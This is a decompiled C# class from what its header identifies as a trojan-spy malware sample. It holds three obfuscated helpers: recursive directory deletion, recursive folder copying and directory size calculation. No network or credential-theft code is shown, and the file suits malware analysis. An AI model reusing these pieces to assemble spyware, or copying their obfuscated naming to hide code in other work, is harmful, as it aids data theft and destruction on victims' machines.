// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.jaksonstekhem
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace AlphaCentavr
{
  internal sealed class jaksonstekhem
  {
    public static void kykytikihrt(string hhhhhhhhhhg)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(hhhhhhhhhhg);
      if (!directoryInfo.Exists)
        return;
      foreach (FileSystemInfo directory in directoryInfo.GetDirectories())
        jaksonstekhem.kykytikihrt(directory.FullName);
      directoryInfo.Delete(true);
    }

    public static void CopddaayDirecaatosdry(
      string sourcfffffeFolffder,
      string dfffestFsdfoldssssser)
    {
      try
      {
        if (!Directory.Exists(dfffestFsdfoldssssser))
          Directory.CreateDirectory(dfffestFsdfoldssssser);
        foreach (string file in Directory.GetFiles(sourcfffffeFolffder))
        {
          string fileName = Path.GetFileName(file);
          File.Copy(file, Path.Combine(dfffestFsdfoldssssser, fileName));
        }
        foreach (string directory in Directory.GetDirectories(sourcfffffeFolffder))
        {
          string fileName = Path.GetFileName(directory);
          jaksonstekhem.CopddaayDirecaatosdry(directory, Path.Combine(dfffestFsdfoldssssser, fileName));
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
    }

    public static long fantastish(string paaaaaath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(paaaaaath);
      return checked (((IEnumerable<FileInfo>) directoryInfo.GetFiles()).Sum<FileInfo>((Func<FileInfo, long>) (fddddddddi => fddddddddi.Length)) + ((IEnumerable<DirectoryInfo>) directoryInfo.GetDirectories()).Sum<DirectoryInfo>((Func<DirectoryInfo, long>) (ddddddddi => jaksonstekhem.fantastish(ddddddddi.FullName))));
    }
  }
}
